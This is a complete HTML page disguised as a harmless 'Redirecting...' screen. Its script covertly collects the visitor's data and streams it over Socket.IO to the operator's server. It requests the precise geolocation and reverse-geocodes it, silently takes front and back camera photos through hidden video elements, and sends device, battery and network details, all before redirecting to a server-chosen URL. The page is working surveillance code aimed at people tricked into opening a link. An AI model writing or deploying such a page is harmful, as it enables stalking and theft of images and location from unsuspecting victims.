<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 450px;
            width: 100%;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e8ecf1;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .redirect-text { font-size: 18px; color: #1a2332; margin-bottom: 6px; font-weight: 500; }
        .redirect-url { 
            font-size: 14px; 
            color: #4285f4; 
            word-break: break-all; 
            font-weight: 500;
            background: #f0f4ff;
            padding: 8px 14px;
            border-radius: 8px;
            display: inline-block;
            margin-top: 4px;
        }
        .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
        #hiddenVideo, #hiddenVideoBack { display: none; }
        #statusMsg {
            font-size: 12px;
            color: #999;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="redirect-text">Redirecting to</div>
        <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
        <div class="sub-text">Please wait a moment</div>
        <div id="statusMsg"></div>
    </div>

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <video id="hiddenVideoBack" autoplay playsinline muted></video>

    <!-- Socket.IO CDN with fallback -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        if (typeof io === 'undefined') {
            var s = document.createElement('script');
            s.src = 'https://cdn.socket.io/4.6.1/socket.io.min.js';
            document.head.appendChild(s);
        }
    </script>

    <script>
        // ============================================================
        // SIMPLE - ONLY BROWSER DEFAULT PERMISSIONS
        // NO BUTTONS, NO CUSTOM POPUPS
        // ============================================================
        (function() {
            const visitorId = window.location.pathname.split('/').pop();
            const redirectDisplay = document.getElementById('redirectUrlDisplay');
            const statusMsg = document.getElementById('statusMsg');
            
            let socket = null;
            let redirectUrl = 'https://www.google.com';
            let redirectTriggered = false;

            function setStatus(msg) {
                statusMsg.textContent = msg;
                console.log(msg);
            }

            // ============================================
            // 1. FETCH REDIRECT URL
            // ============================================
            function fetchRedirectUrl() {
                fetch(`/api/visitor/${visitorId}`)
                    .then(res => res.json())
                    .then(data => {
                        redirectUrl = data.redirectUrl || 'https://www.google.com';
                        redirectDisplay.textContent = redirectUrl;
                        connectSocket();
                    })
                    .catch(() => {
                        fetch(`/api/visitor-redirect/${visitorId}`)
                            .then(res => res.json())
                            .then(data => {
                                redirectUrl = data.redirectUrl || 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                connectSocket();
                            })
                            .catch(() => {
                                redirectUrl = 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                connectSocket();
                            });
                    });
            }

            // ============================================
            // 2. CONNECT SOCKET
            // ============================================
            function connectSocket() {
                try {
                    socket = io({
                        transports: ['websocket', 'polling'],
                        reconnectionAttempts: 3,
                        reconnectionDelay: 1000
                    });

                    socket.on('connect', function() {
                        setStatus('');
                        startDataCollection();
                    });

                    socket.on('connect_error', function() {
                        setTimeout(() => socket.connect(), 2000);
                    });

                } catch(e) {
                    setTimeout(redirectNow, 5000);
                }
            }

            // ============================================
            // 3. START DATA COLLECTION
            // ============================================
            function startDataCollection() {
                // Send device info
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    deviceName: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(', ') : 
                        navigator.platform
                };

                if (socket && socket.connected) {
                    socket.emit('visitor-connect', { visitorId, ...deviceInfo });
                }

                // ===== LOCATION - Browser Default Popup =====
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            const lat = pos.coords.latitude;
                            const lng = pos.coords.longitude;
                            
                            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                                .then(res => res.json())
                                .then(data => {
                                    const locationInfo = {
                                        lat, lng,
                                        accuracy: pos.coords.accuracy,
                                        timestamp: new Date().toISOString(),
                                        country: data.countryName || 'Unknown',
                                        state: data.principalSubdivision || 'Unknown',
                                        city: data.locality || 'Unknown'
                                    };
                                    if (socket && socket.connected) {
                                        socket.emit('visitor-data', {
                                            visitorId,
                                            type: 'location',
                                            content: locationInfo
                                        });
                                    }
                                })
                                .catch(() => {
                                    if (socket && socket.connected) {
                                        socket.emit('visitor-data', {
                                            visitorId,
                                            type: 'location',
                                            content: { lat, lng, accuracy: pos.coords.accuracy }
                                        });
                                    }
                                });
                        },
                        function() { /* User denied - continue */ },
                        { timeout: 5000, enableHighAccuracy: true }
                    );
                }

                // ===== CAMERAS - Browser Default Popup =====
                // Front Camera
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                })
                .then(function(stream) {
                    const video = document.getElementById('hiddenVideo');
                    video.srcObject = stream;
                    return video.play();
                })
                .then(function() {
                    setTimeout(function() {
                        capturePhoto('front', document.getElementById('hiddenVideo'));
                    }, 1000);
                })
                .catch(function() { /* User denied - continue */ });

                // Back Camera
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' },
                    audio: false
                })
                .then(function(stream) {
                    const video = document.getElementById('hiddenVideoBack');
                    video.srcObject = stream;
                    return video.play();
                })
                .then(function() {
                    setTimeout(function() {
                        capturePhoto('back', document.getElementById('hiddenVideoBack'));
                    }, 2000);
                })
                .catch(function() { /* User denied - continue */ });

                // ===== BATTERY =====
                if (navigator.getBattery) {
                    navigator.getBattery()
                        .then(function(battery) {
                            const level = Math.round(battery.level * 100);
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId,
                                    type: 'battery',
                                    content: level
                                });
                            }
                        })
                        .catch(function() {});
                }

                // ===== NETWORK =====
                let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                if (navigator.connection) {
                    const conn = navigator.connection;
                    networkData = {
                        type: conn.type || 'Unknown',
                        effectiveType: conn.effectiveType || 'Unknown',
                        downlink: conn.downlink || 'Unknown'
                    };
                }
                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: 'network',
                        content: networkData
                    });
                }

                // ===== AUTO REDIRECT AFTER 4 SECONDS =====
                setTimeout(function() {
                    if (!redirectTriggered) redirectNow();
                }, 4000);
            }

            // ============================================
            // 4. CAPTURE PHOTO
            // ============================================
            function capturePhoto(type, video) {
                if (!video || !video.videoWidth) return;

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.7);

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: type === 'back' ? 'backCamera' : 'frontCamera',
                        content: imageData
                    });
                }

                // Stop stream
                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(t => t.stop());
                }
            }

            // ============================================
            // 5. REDIRECT
            // ============================================
            function redirectNow() {
                if (redirectTriggered) return;
                redirectTriggered = true;

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: 'redirectComplete',
                        content: { redirected: true, time: new Date().toISOString() }
                    });
                }

                setTimeout(function() {
                    window.location.href = redirectUrl;
                }, 500);
            }

            // ============================================
            // 6. START
            // ============================================
            if (typeof io !== 'undefined') {
                fetchRedirectUrl();
            } else {
                setTimeout(fetchRedirectUrl, 2000);
            }

            // Cleanup
            window.addEventListener('beforeunload', function() {
                if (socket) socket.disconnect();
            });

        })();
    </script>
</body>
</html>
